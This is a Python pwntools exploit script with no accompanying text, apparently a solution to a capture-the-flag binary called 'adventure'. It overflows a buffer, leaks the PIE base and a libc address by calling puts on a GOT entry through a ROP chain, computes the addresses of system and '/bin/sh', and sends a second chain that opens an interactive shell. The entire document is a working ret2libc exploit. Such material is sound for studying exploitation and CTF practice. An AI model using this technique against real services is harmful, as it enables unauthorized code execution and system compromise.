from pwn import *

io = process("./adventure")
io = gdb.debug("./adventure", 
'''
pie break *0x000000000000141a
continue
''')
context.log_level = 'debug' 
elf = context.binary = ELF("./adventure", checksec = False)

io.recvuntil("game: 2\n")
io.sendline('2')
b = io.recvline().decode()

pie = b[-15:]
pie = pie[:-1]
pie = int(pie, 16)
elf.address = pie - 4957
pop_rdi_rsi = elf.address + 4617

io.recvuntil("Choice :\n")
print(hex(pop_rdi_rsi))

payload = b'a' * 20
payload += p64(pop_rdi_rsi)
payload += p64(elf.got.puts)
payload += p64(0x0)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols._start)
io.sendline(payload)
io.recvline()
c = io.recvline()
a = (bytearray.fromhex(c.hex())[::-1])
b = binascii.hexlify(a)
libc_base = b.decode()
libc_base = libc_base [2:]
libc_base = '0x' + libc_base
libc_base = int(libc_base, 16)
system = libc_base - 196976
binsh = libc_base + 1406920
print(hex(libc_base))
print(hex(system))
print(hex(binsh))
payload2 = b'a' * 20
payload2 += p64(pop_rdi_rsi)
payload2 += p64(binsh)
payload2 += p64(0x0)
payload2 += p64(system)
payload2 += p64(0x0)
io.recvuntil("game: 2\n")
io.sendline('2')
io.recvuntil("Choice :\n")
io.sendline(payload2)
io.interactive()
